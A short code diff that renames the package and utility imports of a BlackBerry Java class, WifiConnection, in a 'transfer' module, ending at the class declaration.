@@ -1,4 +1,4 @@
-package com.ht.rcs.blackberry.transfer;
+package blackberry.transfer;
 
 import java.io.IOException;
 
@@ -8,9 +8,9 @@ import javax.microedition.io.StreamConnection;
 import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.WLANInfo;
 
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class WifiConnection extends Connection {
     //#debug
